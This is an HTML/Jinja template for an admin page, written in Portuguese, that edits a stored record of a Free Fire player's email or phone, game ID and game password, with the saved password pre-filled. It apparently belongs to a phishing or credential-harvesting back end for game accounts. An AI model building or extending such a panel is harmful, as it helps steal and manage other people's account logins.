<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Editar Registro - Free Fire</title>
  <style>
    body {
      background: linear-gradient(135deg, #1a1a1a, #0d0d0d);
      color: #f0f0f0;
      font-family: 'Trebuchet MS', sans-serif;
      padding: 40px;
      user-select: none;
    }
    header {
      margin-bottom: 30px;
      border-bottom: 2px solid #d91c1c;
      padding-bottom: 15px;
    }
    header h2 {
      color: #d91c1c;
      text-shadow: 0 0 8px #d91c1c;
      letter-spacing: 1.5px;
    }
    main {
      max-width: 500px;
      margin: 0 auto;
      background: rgba(26, 26, 26, 0.85);
      padding: 25px 30px;
      border-radius: 12px;
      box-shadow: 0 0 15px #d91c1c;
    }
    label {
      display: block;
      margin-bottom: 6px;
      font-weight: 700;
      color: #ff3b3b;
      letter-spacing: 0.5px;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px 15px;
      margin-bottom: 20px;
      border: 2px solid #d91c1c;
      border-radius: 8px;
      background-color: #222;
      color: #f0f0f0;
      font-size: 1rem;
      transition: border-color 0.3s ease;
    }
    input[type="text"]:focus,
    input[type="password"]:focus {
      border-color: #ff3b3b;
      outline: none;
      box-shadow: 0 0 8px #ff3b3b;
    }
    button {
      width: 100%;
      background-color: #d91c1c;
      border: none;
      padding: 14px;
      font-weight: bold;
      font-size: 1.1rem;
      color: white;
      border-radius: 10px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #a71414;
    }
    a.back-link {
      display: block;
      text-align: center;
      margin-top: 20px;
      color: #d91c1c;
      text-decoration: none;
      font-weight: 700;
    }
    a.back-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <header>
    <h2>Editar Registro ID {{ id }}</h2>
  </header>
  <main>
    <form method="POST" action="/editor/{{ id }}">
      <label for="email_or_phone">Email ou Telefone:</label>
      <input type="text" id="email_or_phone" name="email_or_phone" value="{{ email_ou_telefone }}" required />

      <label for="freefire_id">Free Fire ID (opcional):</label>
      <input type="text" id="freefire_id" name="freefire_id" value="{{ freefire_id or '' }}" />

      <label for="senha_freefire">Senha Free Fire:</label>
      <input type="password" id="senha_freefire" name="senha_freefire" value="{{ senha_freefire or '' }}" required />

      <button type="submit">Salvar Alterações</button>
    </form>
    <a href="/admin" class="back-link">← Voltar ao Painel Admin</a>
  </main>
</body>
</html>
